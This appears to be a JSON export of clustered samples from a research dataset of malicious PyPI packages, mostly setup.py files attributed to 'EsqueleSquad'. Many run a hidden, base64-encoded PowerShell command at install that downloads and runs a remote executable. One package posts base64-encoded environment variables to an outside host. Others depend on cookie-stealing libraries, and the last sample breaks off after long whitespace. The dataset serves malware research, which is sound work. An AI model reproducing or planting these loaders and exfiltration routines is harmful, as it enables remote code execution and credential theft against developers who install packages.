:: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-selfedgamestudy-v5.59",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfedgamestudy',\n    packages = ['modlib'],\n    version = '7.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-selfmccontrolstudy-v4.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfmccontrolstudy',\n    packages = ['modlib'],\n    version = '10.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-selfvisapaypalmine-v3.5",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvisapaypalmine',\n    packages = ['modlib'],\n    version = '2.43',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tpcraftcraftencode-v1.8",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcraftcraftencode',\n    packages = ['modlib'],\n    version = '10.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tpcvadlib-v8.29",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvadlib',\n    packages = ['modlib'],\n    version = '4.53',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-tpcvurlpong-v7.17",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvurlpong',\n    packages = ['modlib'],\n    version = '4.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-esqccstringmask-v7.66",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqccstringmask',\n    packages = ['modlib'],\n    version = '9.22',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-25-esqultracc-v5.17",
        "code": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqultracc',\n    packages = ['modlib'],\n    version = '10.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-07-esqgameencodereplace-v7.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AdABwAHkAawBpAGQAcABkAGoAegA5ADkAMgAwADIALwBlAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwB0AG0AcAAtAGwAdgBuAHMAbwBhAHMAcwAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAHQAbQBwAC0AbAB2AG4AcwBvAGEAcwBzAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqgameencodereplace',\n    packages = ['modlib'],\n    version = '2.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-07-libpipultravirtual-v2.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipultravirtual',\n    packages = ['modlib'],\n    version = '2.73',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-07-py-intellibint-v5.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AdABwAHkAawBpAGQAcABkAGoAegA5ADkAMgAwADIALwBlAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwB0AG0AcAAtAGwAdgBuAHMAbwBhAHMAcwAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAHQAbQBwAC0AbAB2AG4AcwBvAGEAcwBzAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-intellibint',\n    packages = ['modlib'],\n    version = '9.93',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-07-selfpyintpaypal-v4.2",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AdABwAHkAawBpAGQAcABkAGoAegA5ADkAMgAwADIALwBlAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwB0AG0AcAAtAGwAdgBuAHMAbwBhAHMAcwAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAHQAbQBwAC0AbAB2AG4AcwBvAGEAcwBzAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpyintpaypal',\n    packages = ['modlib'],\n    version = '1.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-12-esqccpongcpu-v1.16",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqccpongcpu',\n    packages = ['modlib'],\n    version = '9.6',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      }
    ]
  },
  {
    "cluster_id": 71,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-09-artifact-lab-3-package-736f752d-v0.1.3",
        "code": "import os\nimport subprocess\nimport base64\nimport requests\n\ndef hello():\n    headerOS = {\"x-test\":\"os.environ\"}\n    url = \"http://csnr59g8cumhnf5tp4f0icgnzge434rpa.oast.fun\"\n    env = str(os.environ)\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req1 = requests.post(url, data=data, headers=headerOS, timeout=20)\n    headerSub = {\"x-test\":\"sub.call('env')\"}\n    env = str(subprocess.call(\"env\"))\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req = requests.post(url, data=data, headers=headerSub, timeout=20)\n    headerEnviron = {\"x-test\":\"Proc/Environ\"}\n    env = str(subprocess.call([\"cat\", \"/proc/self/environ\"]))\n    benv = env.encode(\"ascii\")\n    b64envb = base64.b64encode(benv)\n    b64env = b64envb.decode(\"ascii\")\n    data = {\"vars\": b64env}\n    req2 = requests.post(url, data=data, headers=headerEnviron, timeout=20)\n\nhello()\n"
      }
    ]
  },
  {
    "cluster_id": 72,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-14-Roblox.-com",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='Roblox. com', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloewndmzvlqe",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloewndmzvlqe', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)"
      }
    ]
  },
  {
    "cluster_id": 73,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-13-value3",
        "code": "# -*- coding: utf-8 -*-\n\"\"\"\nCopyright 2018 Biwin John Joseph\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n\"\"\"\nfrom setuptools import setup, find_packages\nprint('\\n')                                                                                                                                                                                                                                                                                                                                 